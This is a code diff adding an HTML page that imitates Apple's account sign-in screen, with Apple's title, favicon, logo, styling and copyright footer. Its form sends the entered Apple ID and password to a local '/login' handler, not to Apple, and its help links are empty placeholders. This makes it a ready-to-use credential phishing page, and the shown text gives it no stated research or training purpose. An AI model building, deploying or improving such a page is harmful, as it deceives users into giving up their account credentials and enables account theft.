@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Sign in - Apple</title>
+<link rel="icon" href="https://appleid.apple.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes subtlePulse{0%,100%{opacity:0.5}50%{opacity:0.8}}
+body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh}
+.header{width:100%;padding:14px 24px;border-bottom:1px solid #d2d2d7;display:flex;align-items:center;justify-content:center;animation:fadeIn 0.4s ease}
+.header svg{width:20px;height:24px}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
+.card{width:380px;text-align:center;animation:fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1)}
+h1{font-size:22px;font-weight:400;color:#1d1d1f;margin-bottom:4px}
+.subtitle{font-size:14px;color:#86868b;margin-bottom:28px}
+.input-field{width:100%;padding:14px 16px;border:1px solid #d2d2d7;border-radius:10px;font-size:17px;outline:none;margin-bottom:12px;background:#fbfbfd;transition:all 0.3s}
+.input-field:focus{border-color:#0071e3;box-shadow:0 0 0 4px rgba(0,113,227,0.15);background:#fff}
+.arrow-btn{width:40px;height:40px;background:linear-gradient(135deg,#0071e3,#0077ed);border:none;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;margin:16px auto 0;transition:all 0.3s}
+.arrow-btn:hover{transform:scale(1.1);box-shadow:0 4px 12px rgba(0,113,227,0.3)}
+.arrow-btn svg{width:18px;height:18px;fill:white}
+.links{margin-top:28px}
+.links a{display:block;color:#0071e3;font-size:14px;text-decoration:none;margin:10px 0;transition:color 0.2s}
+.links a:hover{text-decoration:underline;color:#005bb5}
+.footer{padding:20px;text-align:center;font-size:12px;color:#86868b;border-top:1px solid #d2d2d7;width:100%;max-width:800px;animation:fadeIn 0.6s ease 0.4s both}
+</style>
+</head>
+<body>
+<div class="header">
+    <svg viewBox="0 0 17 48"><path d="M15.5 36.4c-.9 2-1.3 2.9-2.5 4.7-1.6 2.5-3.9 5.6-6.7 5.6-2.5 0-3.1-1.6-6.4-1.6-3.3 0-4 1.6-6.4 1.7-2.7.1-4.8-2.7-6.4-5.2-4.5-6.9-5-15-2.2-19.3 2-3 5.1-4.8 7.9-4.8 2.9 0 4.7 1.6 7.1 1.6 2.3 0 3.7-1.6 7-1.6 2.5 0 5.2 1.4 7.2 3.7-6.3 3.5-5.3 12.5 1.4 15.2z" fill="#333"/></svg>
+</div>
+<div class="main">
+    <div class="card">
+        <h1>Sign in to Apple Account</h1>
+        <p class="subtitle">Use your Apple Account to sign in.</p>
+        <form action="/login" method="POST">
+            <input type="text" name="email" class="input-field" placeholder="Apple ID" required>
+            <input type="password" name="password" class="input-field" placeholder="Password" required>
+            <button type="submit" class="arrow-btn">
+                <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+            </button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot Apple ID or password?</a>
+            <a href="#">Create Your Apple Account</a>
+        </div>
+    </div>
+</div>
+<div class="footer"><a href="#" style="color:#0071e3;text-decoration:none">Privacy Policy</a> | <a href="#" style="color:#0071e3;text-decoration:none">Terms of Use</a><br><br>Copyright © 2024 Apple Inc.</div>
+</body>
+</html>
